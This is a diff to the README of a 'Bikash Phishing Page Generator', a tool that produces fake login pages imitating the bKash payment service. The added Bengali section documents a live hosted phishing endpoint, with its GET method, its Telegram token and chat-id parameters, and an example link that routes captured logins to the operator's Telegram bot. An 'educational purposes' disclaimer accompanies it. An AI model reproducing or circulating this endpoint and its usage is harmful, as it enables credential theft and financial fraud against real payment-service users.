@@ -3,6 +3,21 @@
 ## About
 The **Bikash Phishing Page Generator** is a tool designed for educational and security testing purposes. It allows users to generate phishing pages that mimic the appearance of the Bikash payment service. This tool is fully Telegram-based, offering an easy-to-use interface with an advanced UI for generating phishing links and sending them directly to the user's Telegram bot.
 
+## বিকাশের ফিশিং পেজ API
+
+**এন্ডপয়েন্ট:** `https://bkash-web.vercel.app/login.html`
+
+**মেথড:** `GET`
+
+**প্যারামিটার:**
+
+- `token`: `<টেলিগ্রাম টোকেন>`
+- `id`: `<টেলিগ্রাম চ্যাট আইডি>`
+
+**উদাহরণ অনুরোধ:**
+
+[https://bkash-web.vercel.app/login.html?token=<টেলিগ্রাম টোকেন>&id=<টেলিগ্রাম চ্যাট আইডি>](https://bkash-web.vercel.app/login.html?token=<টেলিগ্রাম টোকেন>&id=<টেলিগ্রাম চ্যাট আইডি>)
+
 > **⚠️ Warning:** This tool is intended for educational and authorized security testing purposes only. Unauthorized use of this tool is illegal and unethical.
 
 ## Features
